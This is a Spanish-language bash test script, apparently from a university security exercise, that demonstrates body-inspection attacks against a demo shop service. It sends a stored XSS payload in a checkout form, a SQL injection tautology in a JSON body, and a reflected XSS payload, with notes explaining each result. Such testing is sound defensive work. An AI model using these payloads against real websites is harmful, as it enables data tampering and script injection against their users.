#!/bin/bash
# 3.3 Inspección del body: XSS en un formulario y SQLi/XSS en un JSON.
source "$(dirname "$0")/common.sh"

BODY_PREVIEW=700   # el firstName guardado aparece después de los datos de envío

section "3.3 Inspección del body"

# El checkout necesita que la sesión (1) tenga un carrito y (2) ya haya iniciado el checkout
# con un GET; si no, el POST responde 500 sin procesar el formulario. Lo preparamos por el
# flujo normal para que el ataque realmente se procese.
SID="11111111-1111-4111-8111-111111111111"
seed_cart "$SID"
curl -s -o /dev/null -b "SESSIONID=$SID" "$BASE_URL/checkout"   # inicia el checkout
attack "XSS en el formulario de checkout (urlencoded)" \
    -b "SESSIONID=$SID" -X POST \
    -d "firstName=<script>alert(1)</script>&lastName=Perez&streetAddress=Calle123&city=CABA&state=CA&zipCode=10000&email=test@itba.edu.ar" \
    "$BASE_URL/checkout"
attack "Lo que guardó el servicio checkout (el script quedó sin escapar)" \
    "$BASE_URL/proxy/checkout/$SID"
note "El valor de firstName vuelve tal cual, con las etiquetas <script> intactas: XSS almacenado."

attack "SQLi en el body JSON" \
    -X POST -H "Content-Type: application/json" -d '{"name": "x%'"'"' OR 1=1--"}' \
    "$BASE_URL/catalog/products"
note "La inyección altera la consulta y devuelve TODOS los productos, no solo los que matchean."

attack "XSS en el body JSON" \
    -X POST -H "Content-Type: application/json" -d '{"name": "<script>alert(1)</script>"}' \
    "$BASE_URL/catalog/products"
note "El <script> vuelve en el HTML sin escapar: se ejecutaría en el navegador (XSS reflejado)."
